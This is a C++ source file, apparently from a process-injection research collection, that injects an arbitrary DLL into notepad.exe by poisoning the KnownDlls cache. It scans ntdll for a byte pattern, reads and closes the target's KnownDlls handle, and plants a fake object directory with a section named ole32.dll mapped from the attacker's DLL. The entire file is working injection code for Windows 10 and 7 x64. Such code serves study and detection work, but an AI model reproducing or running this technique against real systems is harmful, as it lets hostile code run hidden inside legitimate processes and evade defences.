/**
* Injects a .dll into notepad.exe by poisoning the KnownDlls cache to load a malicious dll instead of a benign
* The current implementation does not support 32bit or WoW64
* We can use any dll that is loaded into the process for the first time when doing a specific action and is a KnownDll.
*  examples found using x64 dbg log: 
	ole32.dll		- Loaded when typing into the notepad file
	comdlg32.dll	- Loaded when saving the document
	nsi.dll			- Loaded when printing the document
* based on: https://www.codeproject.com/Articles/325603/Injection-into-a-Process-Using-KnownDlls, https://modexp.wordpress.com/2019/08/12/windows-process-injection-knowndlls/
*/

#include <Windows.h>
#include <iostream>
#include <vector>

#include "../../common/ntddk.h"


// from https://github.com/frk1/PolandCheater-perfecthook/blob/master/PerfectHook/Utilities.cpp
BYTE* FindBytePattern(const char* module, const char* signature)
{
	static auto ConvertPatternToBytes = [](const char* pattern) 
	{
		std::vector<int> bytes = std::vector<int>{};
		char* start = const_cast<char*>(pattern);
		char* end = const_cast<char*>(pattern) + strlen(pattern);

		for (char* current = start; current < end; ++current)
		{
			if (*current == '?') 
			{
				++current;
				if (*current == '?')
				{
					++current;
				}
				bytes.push_back(-1);
			}
			else 
			{
				bytes.push_back(strtoul(current, &current, 16));
			}
		}
		return bytes;
	};

	BYTE* moduleBaseAddress = (BYTE*)GetModuleHandleA(module);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBaseAddress;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((std::uint8_t*)moduleBaseAddress + dosHeader->e_lfanew);

	auto sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
	auto patternBytes = ConvertPatternToBytes(signature);
	uint8_t* currentAddress = reinterpret_cast<uint8_t*>(moduleBaseAddress);

	int patternSize = patternBytes.size();
	int* patternData = patternBytes.data();

	for (int i = 0; i < sizeOfImage - patternSize; ++i)
	{
		bool found = true;
		for (int j = 0; j < patternSize; ++j)
		{
			if (currentAddress[i + j] != patternData[j] && patternData[j] != -1)
			{
				found = false;
				break;
			}
		}
		if (found) 
		{
			return &currentAddress[i];
		}
	}
	return nullptr;
}


bool PoisonKnownDllsCache(DWORD pid, char* payloadDll, wchar_t* originalKnownDll)
{
	// open process for duplicating handle, suspending/resuming process
	HANDLE notepadProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!notepadProcessHandle)
	{
		printf("[Error] %d - Failed to acquire notepad.exe process handle\n", GetLastError());
		return false;
	}

	// we can search for this address in our own process since ASLR will be the same in the target process for ntdll
	// ntdll Windows 10
	//	8D 51 01                lea     edx, [rcx+1]
	//	48 8D 0D 93 76 09 00    lea     rcx, LdrpKnownDllDirectoryHandle
	BYTE* LdrpKnownDllDirectoryHandle = FindBytePattern("ntdll.dll", "8D 51 01 48 8D 0D");
	
	if (!LdrpKnownDllDirectoryHandle)
	{
		// failed to find LdrpKnownDllDirectoryHandle address using Windows 10 byte pattern. Attempt Windows 7 x64 bye pattern next
		// ntdll Windows 7 x64
		//	8D 56 D3                lea     edx, [rsi - 2Dh]
		//	48 8D 0D C7 F7 0F 00    lea     rcx, LdrpKnownDllDirectoryHandle
		LdrpKnownDllDirectoryHandle = FindBytePattern("ntdll.dll", "8D 56 D3");
		if (!LdrpKnownDllDirectoryHandle)
		{
			printf("[Error] - Failed to find LdrpKnownDllDirectoryHandle in ntdll using Win10 and Win7 byte patterns\n");
			return false;
		}
	}
	
	// + 0x6 to skip the bytes of the previous instruction and the op code before the actual offset value
	int32_t relativeOffset = *(int32_t*)(LdrpKnownDllDirectoryHandle + 0x6);

	// + 0xA because the offset is relative from the start of the next instruction
	BYTE* originalKnownDllsHandleOffset = LdrpKnownDllDirectoryHandle + relativeOffset + 0xA;

	// note: there are methods to get this handle without RPM. For example to iterate over all handles and comparing for with "KnownDlls" name: NtQuerySystemInformation --> NtQueryObject: ObjectNameInformation
	HANDLE originalKnownDllsHandle;
	if (!ReadProcessMemory(notepadProcessHandle, originalKnownDllsHandleOffset, &originalKnownDllsHandle, sizeof(HANDLE), nullptr))
	{
		printf("[Error] - Failed to read original KnownDlls handle from notepad process\n");
		return false;
	}

	printf("[Info] - originalKnownDllsHandle %p\n", originalKnownDllsHandle);

	// create directory
	HANDLE directoryHandle;
	OBJECT_ATTRIBUTES directoryAttributes;
	InitializeObjectAttributes(&directoryAttributes, NULL, 0, NULL, NULL);
	NTSTATUS status = NtCreateDirectoryObject(&directoryHandle, DIRECTORY_ALL_ACCESS, &directoryAttributes);

	// convert payload path to ntpath
	OBJECT_ATTRIBUTES fileAttributes;
	UNICODE_STRING fileName;
	wchar_t payloadDllW[MAX_PATH + 1];
	mbstowcs_s(nullptr, payloadDllW, strlen(payloadDll) + 1, payloadDll, MAX_PATH);
	RtlDosPathNameToNtPathName_U(payloadDllW, &fileName, NULL, NULL);
	InitializeObjectAttributes(&fileAttributes, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	// open payload file
	HANDLE fileHandle;
	IO_STATUS_BLOCK ioStatusBlock;
	status = NtOpenFile(&fileHandle, FILE_GENERIC_READ | FILE_GENERIC_WRITE | FILE_GENERIC_EXECUTE, &fileAttributes, &ioStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);

	// convert KnownDll name to unicode
	OBJECT_ATTRIBUTES sectionAttributes;
	UNICODE_STRING sectionName;
	RtlInitUnicodeString(&sectionName, originalKnownDll);
	InitializeObjectAttributes(&sectionAttributes, &sectionName, OBJ_CASE_INSENSITIVE, directoryHandle, NULL);

	// create section with the name of the KnownDll.
	// the loader will search for a section named \KnownDlls\<originalDllName> and map it into the process before continuing the regular search order 
	HANDLE sectionHandle;
	status = NtCreateSection(&sectionHandle, SECTION_ALL_ACCESS, &sectionAttributes, NULL, PAGE_EXECUTE, SEC_IMAGE, fileHandle);

	// close the KnownDlls handle in remote process
	HANDLE duplicatedKnownDlls;
	if (!DuplicateHandle(notepadProcessHandle, originalKnownDllsHandle, GetCurrentProcess(), &duplicatedKnownDlls, 0, TRUE, DUPLICATE_CLOSE_SOURCE))
	{
		printf("[Error] - Failed to DuplicateHandle KnownDlls\n");
		return false;
	}

	// we don't care about the duplicated handle. We just wanted to close the original one
	CloseHandle(duplicatedKnownDlls);

	// duplicate object directory for remote process
	HANDLE duplicatedDirectory;
	if (!DuplicateHandle(GetCurrentProcess(), directoryHandle, notepadProcessHandle, &duplicatedDirectory, 0, TRUE, DUPLICATE_SAME_ACCESS))
	{
		printf("[Error] - Failed to DuplicateHandle directory\n");
		return false;
	}

	CloseHandle(notepadProcessHandle);

	printf("[Info] - Type anything into the notepad to inject the payload dll\n");
	return true;
}

bool PrintKnownDlls() 
{
	HKEY  knownDllsKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs", 0, KEY_READ | KEY_QUERY_VALUE, &knownDllsKey))
	{
		printf("[Warning] - Failed to open KnownDLLs registry key\n");
		return false;
	}

	printf("[Info] - KnownDlls\n");

	char name[MAX_PATH+1];
	char valueName[MAX_PATH+1];
	DWORD valueNameLength = MAX_PATH;
	DWORD namelen = MAX_PATH;
	int index = 0;
	while (!RegEnumValue(knownDllsKey, index++, valueName, &valueNameLength, NULL, NULL, (BYTE*)name, &namelen))
	{
		printf("\t%s\n", name);
		valueNameLength = MAX_PATH;
		namelen = MAX_PATH;
	}
	RegCloseKey(knownDllsKey);
	return true;
}

int main(int argc, char* argv[])
{
#ifdef _WIN64
#else
	printf("[Error] - The current implementation only supports 64 bit due to not being able to aquire the needed KnownDlls handle in 32bit\n");
	return 1;
#endif
	char* cmdLine = "notepad";

#ifdef _DEBUG
	PrintKnownDlls();
#endif

	if (argc != 2)
	{
		printf("Usage: *.exe dllPath\n");
		return 1;
	}

	STARTUPINFO startupInfo = {};
	PROCESS_INFORMATION processInformation;
	if (!CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInformation))
	{
		printf("[Error] %d - Failed to create notepad process\n", GetLastError());
		return 1;
	}

	char absoluteDllPath[MAX_PATH + 1];
	GetFullPathNameA(argv[1], MAX_PATH + 1, absoluteDllPath, NULL);
	if (!PoisonKnownDllsCache(processInformation.dwProcessId, absoluteDllPath, L"ole32.dll"))
	{
		printf("[Error] - Failed KnownDlls cache poisoning\n");
		return 1;
	}

	printf("[Info] - Press any key to remove injection. We need to keep this process alive so the created section and object directory are valid\n");
	getchar();

	CloseHandle(processInformation.hThread);
	CloseHandle(processInformation.hProcess);
	return 0;
}
